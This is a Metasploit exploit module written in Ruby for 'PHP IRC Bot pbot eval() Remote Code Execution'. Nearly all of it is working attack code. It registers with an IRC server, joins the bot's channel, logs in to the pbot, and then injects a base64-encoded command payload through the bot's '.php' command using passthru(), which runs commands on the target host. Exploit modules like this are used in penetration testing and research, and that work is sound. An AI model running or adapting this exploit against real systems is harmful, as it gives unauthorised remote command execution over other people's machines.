##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PHP IRC Bot pbot eval() Remote Code Execution',
			'Description'    => %q{
					This module allows remote command execution on the PHP IRC bot pbot by abusing
				the usage of eval() in the implementation of the .php command. In order to work,
				the data to connect to the IRC server and channel where find pbot must be provided.
				The module has been successfully tested on the version of pbot analyzed by Jay
				Turla, and published on Infosec Institute, running over Ubuntu 10.04 and Windows XP
				SP3.
				},
			'Author'         =>
				[
					'evilcry', # pbot analysis'
					'Jay Turla', # pbot analysis
					'@bwallHatesTwits', # PoC
					'juan vazquez' # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'EDB', '20168' ],
					[ 'URL', 'http://offensivecomputing.net/?q=node/1417'],
					[ 'URL', 'http://resources.infosecinstitute.com/pbot-analysis/']
				],
			'Platform'       => [ 'unix', 'win'],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'    => 344, # According to RFC 2812, the max length message is 512, including the cr-lf
					'BadChars' => '',
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
						}
				},
			'Targets'  =>
				[
					[ 'pbot', { } ]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Nov 02 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				Opt::RPORT(6667),
				OptString.new('IRC_PASSWORD', [false, 'IRC Connection Password', '']),
				OptString.new('NICK', [true, 'IRC Nickname', 'msf_user']),
				OptString.new('CHANNEL', [true, 'IRC Channel', '#channel']),
				OptString.new('PBOT_PASSWORD', [false, 'pbot Password', ''])
			], self.class)
	end

	def check
		connect

		response = register(sock)
		if response =~ /463/ or response =~ /464/
			print_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
			return Exploit::CheckCode::Unknown
		end

		response = join(sock)
		if not response =~ /353/ and not response =~ /366/
			print_error("#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel")
			return Exploit::CheckCode::Unknown
		end
		response = pbot_login(sock)
		quit(sock)
		disconnect

		if response =~ /auth/ and response =~ /logged in/
			return Exploit::CheckCode::Vulnerable
		else
			return Exploit::CheckCode::Safe
		end
	end

	def send_msg(sock, data)
		sock.put(data)
		data = ""
		begin
			read_data = sock.get_once(-1, 1)
			while not read_data.nil?
				data << read_data
				read_data = sock.get_once(-1, 1)
			end
		rescue EOFError
		end
		data
	end

	def register(sock)
		msg = ""

		if datastore['IRC_PASSWORD'] and not datastore['IRC_PASSWORD'].empty?
			msg << "PASS #{datastore['IRC_PASSWORD']}\r\n"
		end

		if datastore['NICK'].length > 9
			nick = rand_text_alpha(9)
			print_error("The nick is longer than 9 characters, using #{nick}")
		else
			nick = datastore['NICK']
		end

		msg << "NICK #{nick}\r\n"
		msg << "USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\r\n"

		response = send_msg(sock,msg)
		return response
	end

	def join(sock)
		join_msg = "JOIN #{datastore['CHANNEL']}\r\n"
		response = send_msg(sock, join_msg)
		return response
	end

	def pbot_login(sock)
		login_msg = "PRIVMSG #{datastore['CHANNEL']} :.login"
		if datastore['PBOT_PASSWORD'] and not datastore['PBOT_PASSWORD'].empty?
			login_msg << " #{datastore['PBOT_PASSWORD']}"
		end
		login_msg << "\r\n"
		response = send_msg(sock, login_msg)
		return response
	end

	def pbot_command(sock)
		encoded = Rex::Text.encode_base64(payload.encoded)
		command_msg = "PRIVMSG #{datastore['CHANNEL']} :.php #{rand_text_alpha(1)} passthru(base64_decode(\"#{encoded}\"));\r\n"
		response = send_msg(sock, command_msg)
		return response
	end

	def quit(sock)
		quit_msg = "QUIT :bye bye\r\n"
		sock.put(quit_msg)
	end

	def exploit
		connect

		print_status("#{rhost}:#{rport} - Registering with the IRC Server...")
		response = register(sock)
		if response =~ /463/ or response =~ /464/
			print_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
			return
		end

		print_status("#{rhost}:#{rport} - Joining the #{datastore['CHANNEL']} channel...")
		response = join(sock)
		if not response =~ /353/ and not response =~ /366/
			print_error("#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel")
			return
		end

		print_status("#{rhost}:#{rport} - Registering with the pbot...")
		response = pbot_login(sock)
		if not response =~ /auth/ or not response =~ /logged in/
			print_error("#{rhost}:#{rport} - Error registering with the pbot")
			return
		end

		print_status("#{rhost}:#{rport} - Exploiting the pbot...")
		pbot_command(sock)

		quit(sock)
		disconnect
	end
end
